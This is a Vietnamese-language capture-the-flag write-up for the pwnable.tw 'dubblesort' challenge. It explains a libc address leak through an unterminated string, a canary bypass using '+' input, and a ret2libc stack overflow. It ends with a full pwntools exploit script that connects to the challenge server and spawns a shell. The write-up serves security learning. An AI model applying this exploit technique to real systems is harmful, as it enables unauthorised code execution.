---
title: '[Pwnable.tw] – Dubblesort'
slug: dubblesort
type: writeup
date: 2021-12-08
summary: '[Pwnable.tw] – [Dubblesort](https://pwnable.tw/challenge/#4)...'
tags: [security, writeup]
---

## [Pwnable.tw] – [Dubblesort](https://pwnable.tw/challenge/#4)
Tiếp theo chúng ta sẽ làm 1 bài sử dụng kỹ thuật ret2libc :3
Kiểm tra các cơ chế bảo vệ và các thông tin cơ bản của file
Sau đó dùng IDA để phân tích file binary và code C:
Chạy test thử chương trình như hình dưới thì vô tình thấy được 1 vài ký tự lạ xuất hiện sau chuỗi được in ra.
==> Đây là 1 lỗi có thể khai thác
Nói vu vơ vậy nhưng chúng ta phải mở debug lên mới có thể thấy rõ được đây có phải là lỗi hay không :vv
Như chúng ta thấy thì khi chúng ta nhập vào trong stack thì chuỗi đưa vào không có ký tự kết thúc chuỗi :3 Nên là chương trình sẽ in ra chuỗi mình nhập vào và các giá trị trong stack cho đến khi nhận được ký tự kết thúc chuỗi.
Chúng ta xác định được vị trí của input trên stack và khi kiểm tra libc bằng lệnh vmmap chúng ta nhận ra rằng có thể leak được địa chỉ của libc trên stack như sau:
Dựa vào lỗi trên là chúng ta đã có thể leak được libc base để tiến sang bước tiếp theo.  Đây là thư viện dùng chung tại máy local. Tuy nhiên trên server dùng thư viện libc_32.so.6, do đó ta phải chuyển đổi sang offset tương ứng của libc_32.so.6. Như vậy để tính địa chỉ bắt đầu của libc_32.so.6 khi thực thi trên server, ta chỉ cần lấy địa chỉ leak được – 0x1b000a.
```
addr_libc = addr_leak - 0x1b000a
```
Có được địa chỉ bắt đầu của libc, ta dễ dàng tìm được địa chỉ của hàm system() và chuỗi “/bin/sh” có sẵn trong libc.
Phân tích chức năng tiếp theo chúng ta nhận thấy được rằng chương trình không hề giới hạn số lượng số ghi vào stack để sort, cho dù vượt quá stack :vv điều đó có nghĩa là mình có thể ghi lên địa chỉ ret nếu biết được offset tuy nhiên thì hoàn toàn có thể thay đổi giá trị của stack.
Tuy nhiên phải quay lại cơ chế bảo vệ 1 chút đó là canary đã được bật, chúng ta phải bypass canary nữa mới hoàn thành được. Và trong lần thử nếu thay vì mình nhập số bất kỳ thì mình nhập “+” sẽ giữ lại giá trị trong stack. Đây là 1 điều kiện quan trọng để giữ nguyên giá trị canary.
Sử dụng debug để xác định vị trí của canary là ở offset thứ 24 bằng cách như sau:
Sau khi nhập sort rồi thì có thể mở stack lên để tính toán offset:
===>    + ‘1’ * 24 để điền đầy mảng NUMBERS
+ ‘+’ để bypass canary
+ addr_system * 8. Trong đó số thứ 8 là vị trí của return address thực sự, còn 7 số đầu nhằm mục đích padding và không làm thay đổi thứ tự stack.
+ addr_binsh * 2. Trong đó số thứ 2 là vị trí của tham số, còn số thứ 1 là return address của hàm system().
```
from pwn import *
BIN = './dubblesort'
libc = ELF("./libc_32.so.6")
#libc = ELF("./usr/lib/i386-linux-gnu/libc-2.32.so")
def exploit():
    # __breakpoint="""
    #     b*main+146
    #     """
    # gdb.attach(io,__breakpoint)
    io.sendlineafter(b"What your name :",b'A'*4*6)
    io.recvuntil(b"A"*4*6)
    libc_base = u32(io.recv(4))-0x1b000a
    print("Libc_base : ", hex(libc_base))
    system = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b"/bin/sh"))
    print('System : ',hex(system))
    print('Bin_sh : ',hex(bin_sh))
    l = 24 + 1 + 9 + 1
    io.sendlineafter('to sort :',str(l))
    for i in range(24):
        io.sendlineafter('number : ','1')
    io.sendline('+') #canary
    for i in range(9):
        io.sendlineafter('number : ',str(system))
    io.sendlineafter('number : ',str(bin_sh))
    io.interactive()
#io = process(BIN) #,env={"LD_PRELOAD":"./libc_32.so.6"}
io = remote('chall.pwnable.tw',10101)
context.log_level = 'debug'
exploit()
```